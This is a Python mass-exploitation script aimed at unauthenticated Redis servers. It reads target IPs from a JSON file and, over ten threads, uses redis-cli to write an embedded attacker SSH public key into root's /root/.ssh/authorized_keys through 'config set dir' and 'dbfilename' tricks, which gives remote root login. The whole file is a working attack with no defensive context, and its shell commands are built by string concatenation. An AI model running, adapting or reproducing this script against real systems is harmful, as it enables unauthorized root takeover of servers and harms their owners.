import os
import json
from multiprocessing.pool import ThreadPool as Pool

def process_thread(ip):
    try:
        ip = ip.replace('http://', '')
        if len(ip) > 25:
            return
        if ':' in ip:
            ip, port = ip.split(':')
        else:
            port = 6379

        print('trying:' + ip + ':' + port)
        result = os.popen(
            "echo '\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAo/Hp7BruXfPnUKuGbPqJTsSmLfh+i9CAGwOFTrEeEaali8s8mLGY99MfaZ9TeddrkuiasAldXpRZgHnPdn6PYDIsptXU/6I9kUuhtKkFZlQlKtt7DTzi5nOkfTV08WTnpDE5JElC15xR+vh35cjnOKXT3piavLnCvKr2BQkie8baHPnX98IaBmhZDB32gqztnVV6r1lUZnEOR/Fs4DmUj94fYw+HSoqRV4R17437FR24R247k14vmA7CsUCRBzQBvBvHUIwuYm7hcvGHXghlrQ5I1KJnFCj5qNegGouIu34nnfMbXleo0ShmsoDfeTCbZIXjPAcqYXvQlrBjNqzJVw== root@XYLink.GW\n\n'|redis-cli -h " + ip + " -p " + port + " -x set test")
        if 'OK' in result.read():
            result = os.popen("echo 'config set dir /root/.ssh'|redis-cli -h " + ip + ' -x')
            if 'OK' in result.read():
                result = os.popen("echo 'config set dbfilename \'authorized_keys\''|redis-cli -h " + ip + ' -x')
                result = os.popen("echo 'save'|redis-cli -h " + ip + ' -x')
                print('[+]', ip, port, result.read())
    except AssertionError:
        print('timeout')

if __name__ == '__main__':
    threads = Pool(10)
    ips = []
    with open('redis.json','r') as redis_content:
        ips = json.loads(redis_content.read())
    for ip in ips:
        threads.apply_async(process_thread, args=(ip,))

    threads.close()
    threads.join()
